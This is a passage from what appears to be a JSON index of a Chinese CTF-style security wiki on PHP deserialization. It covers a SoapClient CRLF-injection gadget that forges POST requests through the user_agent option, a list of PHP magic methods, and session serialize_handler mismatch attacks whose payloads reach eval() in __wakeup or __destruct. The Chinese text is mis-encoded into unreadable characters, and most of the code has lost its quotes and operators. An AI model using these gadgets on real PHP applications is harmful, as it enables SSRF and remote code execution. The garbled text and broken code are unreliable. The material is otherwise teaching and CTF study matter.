CRLFæ¼æ´ä»ä¸Šå›¾å¯ä»¥çœ‹åˆ°ï¼ŒSOAPActionå¤„å¯æ§ï¼Œå¯ä»¥æŠŠ\\x0d\\x0aæ³¨å…¥åˆ°SOAPActionï¼ŒPOSTè¯·æ±‚çš„headerå°±å¯ä»¥è¢«æ§åˆ¶ ?php$a = new SoapClient(null,array(uri=bbb\\r \\r ccc\\r , location=http://127.0.0.1:5555/path));$b = serialize($a);echo $b;$c = unserialize($b);$c-not_exists_function(); ä½†Content-Typeåœ¨SOAPActionçš„ä¸Šé¢ï¼Œå°±æ— æ³•æ§åˆ¶Content-Typ,ä¹Ÿå°±ä¸èƒ½æ§åˆ¶POSTçš„æ•°æ® åœ¨headeré‡ŒUser-Agentåœ¨Content-Typeå‰é¢ https://www.php.net/manual/zh/soapclient.soapclient.php : The user_agent option specifies string to use in User-Agent header. user_agentåŒæ ·å¯ä»¥æ³¨å…¥CRLFï¼Œæ§åˆ¶Content-Typeçš„å€¼ wupco ?php$target = http://127.0.0.1:5555/path;$post_string = data=something;$headers = array( X-Forwarded-For: 127.0.0.1, Cookie: PHPSESSID=my_session );$b = new SoapClient(null,array(location = $target,user_agent=wupco^^Content-Type: application/x-www-form-urlencoded^^.join(^^,$headers).^^Content-Length: .(string)strlen($post_string).^^^^.$post_string,uri = aaab));$aaa = serialize($b);$aaa = str_replace(^^,\\r ,$aaa);$aaa = str_replace(,,$aaa);echo $aaa;$c = unserialize($aaa);$c-not_exists_function();?"},{"title":"çŸ¥è¯†ç‚¹","path":"/wiki/WP/ååºåˆ—åŒ–/php/çŸ¥è¯†ç‚¹.html","content":"é­”æœ¯æ–¹æ³•__wakeup() //ä½¿ç”¨unserializeæ—¶è§¦å‘__sleep() //ä½¿ç”¨serializeæ—¶è§¦å‘__destruct() //å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘__call() //åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘__callStatic() //åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘__get() //ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®__set() //ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§__isset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘__unset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘__toString() //æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘__invoke() //å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘ å¸¸è§„æ¼æ´__WAKEUPå°†åœ¨åºåˆ—åŒ–ä¹‹åç«‹å³è¢«è°ƒç”¨,å½“åºåˆ—åŒ–å­—ç¬¦ä¸²è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„æ•°å­—å€¼å¤§äºçœŸå®ç±»ä¸­å±æ€§çš„ä¸ªæ•°æ—¶å°±ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œã€‚ __DESTRUCTPHPä¸­SESSIONååºåˆ—åŒ–ï¼ˆé‡ç‚¹ï¼‰ç®€ä»‹ä¸åŸºç¡€çŸ¥è¯†åœ¨php.iniä¸­å­˜åœ¨ä¸‰é¡¹é…ç½®é¡¹ï¼š session.save_path= â€“è®¾ç½®sessionçš„å­˜å‚¨è·¯å¾„ session.save_handler= â€“è®¾å®šç”¨æˆ·è‡ªå®šä¹‰sessionå­˜å‚¨å‡½æ•°ï¼Œå¦‚æœæƒ³ä½¿ç”¨PHPå†…ç½®ä¼šè¯å­˜å‚¨æœºåˆ¶ä¹‹å¤–çš„å¯ä»¥ä½¿ç”¨æœ¬å‡½æ•°(æ•°æ®åº“ç­‰æ–¹å¼) session.auto_start boolen â€“æŒ‡å®šä¼šè¯æ¨¡å—æ˜¯å¦åœ¨è¯·æ±‚å¼€å§‹æ—¶å¯åŠ¨ä¸€ä¸ªä¼šè¯ï¼Œé»˜è®¤ä¸º0ä¸å¯åŠ¨ session.serialize_handler string â€“å®šä¹‰ç”¨æ¥åºåˆ—åŒ–ååºåˆ—åŒ–çš„å¤„ç†å™¨åå­—ã€‚é»˜è®¤ä½¿ç”¨php (php5.5.4) ä»¥ä¸Šçš„é€‰é¡¹å°±æ˜¯ä¸PHPä¸­çš„Session å­˜å‚¨ å’Œ åºåˆ—åŒ–å­˜å‚¨ æœ‰å…³çš„é€‰é¡¹ã€‚ åœ¨ä½¿ç”¨xamppç»„ä»¶å®‰è£…ä¸­ï¼Œä¸Šè¿°çš„é…ç½®é¡¹çš„è®¾ç½®å¦‚ä¸‹ï¼š session.save_path=D:\\xampp\\tmp è¡¨æ˜æ‰€æœ‰çš„sessionæ–‡ä»¶éƒ½æ˜¯å­˜å‚¨åœ¨xampptmpä¸‹ session.save_handler=files è¡¨æ˜sessionæ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼æ¥è¿›è¡Œå­˜å‚¨çš„ session.auto_start=0 è¡¨æ˜é»˜è®¤ä¸å¯åŠ¨session session.serialize_handler=php è¡¨æ˜sessionçš„é»˜è®¤åºåˆ—åŒ–å¼•æ“ä½¿ç”¨çš„æ˜¯phpåºåˆ—è¯å¼•æ“ åœ¨ä¸Šè¿°çš„é…ç½®ä¸­ï¼Œsession.serialize_handleræ˜¯ç”¨æ¥è®¾ç½®sessionçš„åºåˆ—åŒ–å¼•æ“çš„ï¼Œé™¤äº†é»˜è®¤çš„PHPå¼•æ“ä¹‹å¤–ï¼Œè¿˜å­˜åœ¨å…¶ä»–å¼•æ“ï¼Œä¸åŒçš„å¼•æ“æ‰€å¯¹åº”çš„sessionçš„å­˜å‚¨æ–¹å¼ä¸ç›¸åŒã€‚ å¼•æ“ sessionå­˜å‚¨æ–¹å¼ php(php5.5.4) å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®å+ç«–çº¿ php_serialize(php5.5.4) å­˜å‚¨æ–¹å¼æ˜¯ï¼Œç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„é”®å’Œå€¼ï¼ˆå°†sessionä¸­çš„keyå’Œvalueéƒ½ä¼šè¿›è¡Œåºåˆ—åŒ–ï¼‰ php_binary å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦+é”®å+ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼ åœ¨PHP (php5.5.4) ä¸­é»˜è®¤ä½¿ç”¨çš„æ˜¯PHPå¼•æ“ï¼Œå¦‚æœè¦ä¿®æ”¹ä¸ºå…¶ä»–çš„å¼•æ“ï¼Œåªéœ€è¦æ·»åŠ ä»£ç ini_set(session.serialize_handler, éœ€è¦è®¾ç½®çš„å¼•æ“å);è¿›è¡Œè®¾ç½®ã€‚ ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š php ?phpini_set(session.serialize_handler, php_serialize); //è®¾ç½®åºåˆ—åŒ–å¼•æ“ä½¿ç”¨php_serializesession_start();// do something...... å­˜å‚¨æœºåˆ¶ **phpä¸­çš„sessionä¸­çš„å†…å®¹å¹¶ä¸æ˜¯æ”¾åœ¨å†…å­˜ä¸­çš„ï¼Œè€Œæ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼æ¥å­˜å‚¨çš„ï¼Œå­˜å‚¨æ–¹å¼å°±æ˜¯ç”±é…ç½®é¡¹session.save_handleræ¥è¿›è¡Œç¡®å®šçš„ï¼Œé»˜è®¤æ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼å­˜å‚¨ã€‚**å­˜å‚¨çš„æ–‡ä»¶æ˜¯ä»¥sess_sessionid(PHPSESSID)æ¥è¿›è¡Œå‘½åçš„ï¼Œæ–‡ä»¶çš„å†…å®¹å°±æ˜¯sessionå€¼ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–ä¹‹åçš„å†…å®¹ã€‚å‡è®¾æˆ‘ä»¬çš„ç¯å¢ƒæ˜¯xamppï¼Œé‚£ä¹ˆé»˜è®¤é…ç½®å¦‚ä¸Šæ‰€è¿°ã€‚ åœ¨é»˜è®¤é…ç½®æƒ…å†µä¸‹ï¼ˆåœ¨phpå¼•æ“ä¸‹ï¼šï¼‰ï¼š php ?phpsession_start() // session_start()ä¼šåˆ›å»ºæ–°ä¼šè¯æˆ–è€…é‡ç”¨ç°æœ‰ä¼šè¯$_SESSION[name] = spoock;var_dump();? å¯ä»¥çœ‹åˆ°PHPSESSIDçš„å€¼æ˜¯jo86ud4jfvu81mbg28sl2s56c2ï¼Œæ‰€ä»¥åœ¨xampptmpä¸‹å­˜å‚¨çš„æ–‡ä»¶åæ˜¯sess_jo86ud4jfvu81mbg28sl2s56c2ï¼Œæ–‡ä»¶çš„å†…å®¹æ˜¯name|s:6:spoock; ã€‚nameæ˜¯é”®å€¼ï¼Œs:6:spoock;æ˜¯serialize(spoock)çš„ç»“æœï¼ˆphpå¼•æ“æ–¹å¼å­˜å‚¨ï¼šé”®å+ç«–çº¿ |+ç»è¿‡serialize()å‡½æ•°åºåˆ—å¤„ç†çš„å€¼ï¼‰ã€‚ åœ¨php_serializeå¼•æ“ä¸‹ï¼š php ?phpini_set(session.serialize_handler, php_serialize); // è®¾ç½®åºåˆ—åŒ–å¼•æ“ä½¿ç”¨php_serializesession_start(); // å¯åŠ¨æ–°ä¼šè¯æˆ–è€…é‡ç”¨ç°æœ‰ä¼šè¯ $_SESSION[name] = spoock; var_dump();? SESSIONæ–‡ä»¶çš„å†…å®¹æ˜¯a:1:{s:4:name;s:6:spoock;} ã€‚a:1æ˜¯ä½¿ç”¨php_serializeè¿›è¡Œåºåˆ—è¯éƒ½ä¼šåŠ ä¸Šã€‚åŒæ—¶ä½¿ç”¨php_serializeä¼šå°†sessionä¸­çš„key(é”®)å’Œvalue(å€¼)éƒ½ä¼šè¿›è¡Œåºåˆ—åŒ–ã€‚ åœ¨php_binaryå¼•æ“ä¸‹ï¼šå­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦+é”®å+ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼ php ?phpini_set(session.serialize_handler, php_binary);session_start();$_SESSION[name] = spoock;var_dump();? SESSIONæ–‡ä»¶çš„å†…å®¹æ˜¯names:6:spoock; ã€‚ç”±äºnameçš„é•¿åº¦æ˜¯4ï¼Œ4åœ¨ASCIIè¡¨ä¸­å¯¹åº”çš„å°±æ˜¯EOTï¼ˆè¿™ä¸ªï¼‰ã€‚æ ¹æ®php_binaryçš„å­˜å‚¨è§„åˆ™ï¼Œæœ€åå°±æ˜¯names:6:spoock; ã€‚(çªç„¶å‘ç°ASCIIçš„å€¼ä¸º4çš„å­—ç¬¦æ— æ³•åœ¨ç½‘é¡µä¸Šé¢æ˜¾ç¤ºï¼Œè¿™ä¸ªå¤§å®¶è‡ªè¡Œå»æŸ¥ASCIIè¡¨å§) SESSIONåºåˆ—åŒ–æ¼æ´åˆ©ç”¨php ?phpclass syclover var $func=; function __construct() // __construct()åœ¨å®ä¾‹åŒ–æ˜¯è¢«è°ƒç”¨ $this-func = phpinfo(); function __wakeup() eval($this-func); unserialize($_GET[a]);? åœ¨11è¡Œå¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†ååºåˆ—åŒ–ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¼ å…¥ä¸€ä¸ªç‰¹å®šçš„å­—ç¬¦ä¸²ï¼Œååºåˆ—åŒ–ä¸ºsycloverçš„ä¸€ä¸ªç¤ºä¾‹ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ‰§è¡Œeval()æ–¹æ³•ã€‚æˆ‘ä»¬è®¿é—®localhost/test.php?a=O:8:syclover:1:{s:4:func;s:14:echo spoock;;} ã€‚é‚£ä¹ˆååºåˆ—åŒ–å¾—åˆ°çš„å†…å®¹æ˜¯ï¼š php object(syclover)[1] public func = string echo spoock; (length=14) **æœ€åé¡µé¢è¾“å‡ºçš„å°±æ˜¯spoockï¼Œè¯´æ˜æœ€åæ‰§è¡Œäº†æˆ‘ä»¬å®šä¹‰çš„echo â€œspoockâ€;æ–¹æ³•ã€‚**è¿™å°±æ˜¯ä¸€ä¸ªç®€å•çš„åºåˆ—åŒ–çš„æ¼æ´çš„æ¼”ç¤º PHP SESSIONä¸­çš„åºåˆ—åŒ–å±å®³PHPä¸­çš„Sessionçš„å®ç°æ˜¯æ²¡æœ‰çš„é—®é¢˜çš„ï¼Œå±å®³ä¸»è¦æ˜¯ç”±äºç¨‹åºå‘˜çš„Sessionä½¿ç”¨ä¸å½“è€Œå¼•èµ·çš„ã€‚**å¦‚æœè®¾ç½®çš„sessionåºåˆ—åŒ–é€‰æ‹©å™¨ä¸é»˜è®¤çš„ä¸åŒçš„è¯å°±å¯èƒ½ä¼šäº§ç”Ÿæ¼æ´ï¼ˆä¼šå¯¼è‡´æ•°æ®æ— æ³•æ­£ç¡®çš„ååºåˆ—åŒ–ï¼‰ã€‚**é€šè¿‡ç²¾å¿ƒæ„é€ çš„æ•°æ®åŒ…ï¼Œå°±å¯ä»¥ç»•è¿‡ç¨‹åºçš„éªŒè¯æˆ–è€…æ˜¯æ‰§è¡Œä¸€äº›ç³»ç»Ÿçš„æ–¹æ³•ã€‚ä¾‹å¦‚: php $_SESSION[spoock] = |O:11:PeopleClass:0:; ä¸Šè¿°çš„$_SESSIONçš„æ•°æ®å¦‚æœä½¿ç”¨php_serializeï¼Œé‚£ä¹ˆæœ€åçš„å­˜å‚¨çš„å†…å®¹å°±æ˜¯a:1:{s:6:spoock;s:24:|O:11:PeopleClass:0:{};} ã€‚ ä½†æ˜¯æˆ‘ä»¬åœ¨è¿›è¡Œè¯»å–çš„æ—¶å€™ï¼Œå¦‚æœé€‰æ‹©çš„æ˜¯phpï¼Œé‚£ä¹ˆæœ€åè¯»å–çš„å†…å®¹æ˜¯ï¼š php array (size=1) a:1:s:6:spoock;s:24: = object(__PHP_Incomplete_Class)[1] public __PHP_Incomplete_Class_Name = string PeopleClass (length=11) è¿™æ˜¯å› ä¸ºå½“ä½¿ç”¨phpå¼•æ“çš„æ—¶å€™ï¼Œphpå¼•æ“ä¼šä»¥ç«–æ  | ä½œä¸ºä½œä¸ºkey(é”®)å’Œvalue(å€¼)çš„åˆ†éš”ç¬¦ï¼Œé‚£ä¹ˆå°±ä¼šå°†a:1:{s:6:â€œspoockâ€;s:24:â€ä½œä¸ºSESSIONçš„key(é”®)ï¼Œå°†O:11:â€œPeopleClassâ€:0:{}ä½œä¸ºvalue(å€¼)ï¼Œç„¶åè¿›è¡Œååºåˆ—åŒ–ï¼Œæœ€åå°±ä¼šå¾—åˆ°PeopleClasè¿™ä¸ªç±»ã€‚ è¿™ç§ç”±äºåºåˆ—åŒ–å’Œååºåˆ—åŒ–æ‰€ä½¿ç”¨çš„ä¸ä¸€æ ·çš„å¼•æ“å°±æ˜¯é€ æˆPHP Sessionåºåˆ—è¯æ¼æ´çš„åŸå› ã€‚ å®é™…åˆ©ç”¨å­˜åœ¨s1.phpå’Œus2.phpè¿™ä¸¤ä¸ªæ–‡ä»¶ï¼Œ2ä¸ªæ–‡ä»¶æ‰€ä½¿ç”¨çš„SESSIONçš„å¼•æ“ä¸ä¸€æ ·ï¼Œå°±å½¢æˆäº†ä¸€ä¸ªæ¼æ´ã€‚ s1.phpï¼Œä½¿ç”¨php_serializeæ¥å¤„ç†session php ?phpini_set(session.serialize_handler, php_serialize);session_start();$_SESSION[spoock]=$_GET[a]; us2.phpï¼Œä½¿ç”¨phpæ¥å¤„ç†session php ini_set(session.serialize_handler, php);`localhost/s1.php?a=|O:5:lemon:1:s:2:hi;s:14:echo spoock;;`session_start();class lemon var $hi; function __construct() $this-hi = phpinfo();; function __destruct() eval($this-hi); // O:5:lemon:1:s:2:hi;s:14:echo spoock;; æ­¤é¢˜åœ¨s1.phpä¸­æœ‰å¯ä»¥ä¼ å…¥sessionçš„ç‚¹ï¼Œæ‰€ä»¥å°±ä¸ç”¨æ„é€ è¡¨å•äº†ï¼Œè¿™é¢˜çš„çªç ´ç‚¹åœ¨å“ªé‡Œï¼Œæ²¡é”™ï¼Œå°±æ˜¯æˆ‘å¤‡æ³¨çš„é‚£å—s2.phpä¸­ini_set(session.serialize_handler, php);ï¼Œé€‰æ‹©sessionåºåˆ—åŒ–å¤„ç†å™¨ã€‚ å½“è®¿é—®s1.phpæ—¶ï¼Œæäº¤å¦‚ä¸‹çš„æ•°æ®å¹¶å­˜å‚¨åˆ°sessionæ–‡ä»¶ä¸­ï¼š php localhost/s1.php?a=|O:5:lemon:1:s:2:hi;s:14:echo spoock;;1 æ­¤æ—¶ä¼ å…¥çš„æ•°æ®ä¼šæŒ‰ç…§php_serializeæ¥è¿›è¡Œåºåˆ—åŒ–ï¼Œç”±s2.phpè¯»å–æ—¶æŒ‰ç…§phpæ¥ååºåˆ—åŒ–ã€‚ O:5:â€œlemonâ€:1:{s:2:â€œhiâ€;s:14:â€œecho â€œspoockâ€;â€;}ç”±ä»¥ä¸‹åºåˆ—åŒ–æ¥å¾—åˆ°ï¼Œåœ¨åŠ ä¸Šä¸€ä¸ªç«–æ  |å°±è¡Œäº† php ?phpclass lemon public $hi=xxxxx;$obj = new lemon();echo serialize($obj);?xxxxxå¤„æŒ‰ç…§ä½ æƒ³æ‰§è¡Œçš„ä»£ç æ¥å¡«å†™ï¼Œè¿™é‡Œå¡«çš„æ˜¯echo spoock æ­¤æ—¶è®¿é—®us2.phpæ—¶ï¼Œé¡µé¢è¾“å‡ºï¼ŒspoockæˆåŠŸæ‰§è¡Œäº†æˆ‘ä»¬æ„é€ çš„å‡½æ•°ã€‚å› ä¸ºåœ¨è®¿é—®us2.phpæ—¶ï¼Œç¨‹åºä¼šæŒ‰ç…§phpæ¥ååºåˆ—åŒ–SESSIONä¸­çš„æ•°æ®ï¼Œæ­¤æ—¶å°±ä¼šååºåˆ—åŒ–ä¼ªé€ çš„æ•°æ®ï¼Œå°±ä¼šå®ä¾‹åŒ–lemonå¯¹è±¡ï¼Œæœ€åå°±ä¼šæ‰§è¡Œææ„å‡½æ•°ä¸­çš„eval()æ–¹æ³•ã€‚"}]